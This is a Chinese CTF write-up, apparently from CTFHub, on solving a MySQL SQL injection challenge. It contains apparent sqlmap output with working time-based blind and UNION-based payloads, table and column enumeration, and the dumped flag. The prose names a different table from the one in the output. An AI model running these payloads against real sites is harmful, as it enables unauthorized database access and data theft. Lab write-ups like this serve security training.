---
title: MySQL结构
date: 2024-11-23T18:44:33Z
lastmod: 2024-11-23T18:50:14Z
---

# MySQL结构

根据网页显示内容输入1进行测试，此题可能存在 SQL 注入。此题与前一题类似，这次使用手工注入。先判断是否存在注入，发现存在注入后检查注入点。判断字段数量，然后检查数据库位置，知道数据库位置后[查看数据库版本](https://so.csdn.net/so/search?q=%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC&spm=1001.2101.3001.7020)和数据库名。接着查看全部数据库名，并查看这些数据库的表名，最后在 lvlbiqemvj 表中的数据发现此题 flag 。

```shell
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4673 FROM (SELECT(SLEEP(5)))Zdxl)

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-3592 UNION ALL SELECT CONCAT(0x7171717871,0x47507355576e4e6b494d4c75586462704e727346624f6d564d6e6668534473684f79787847454a55,0x717a7a7671),NULL-- -

```

```shell
Database: sqli                                                                                                                            
[2 tables]
+------------+
| egymeqgjcz |
| news       |
+------------+
```

```shell
Database: sqli                                                                                                                            
Table: egymeqgjcz
[1 column]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| zfhrovplks | varchar(100) |
+------------+--------------+

Database: sqli
Table: news
[2 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| data   | varchar(20) |
| id     | int(10)     |
+--------+-------------+
```

```shell
Database: sqli
Table: egymeqgjcz
[1 entry]
+----------------------------------+
| zfhrovplks                       |
+----------------------------------+
| ctfhub{4ab37bed5dffcdbe6b965b8a} |
+----------------------------------+

```
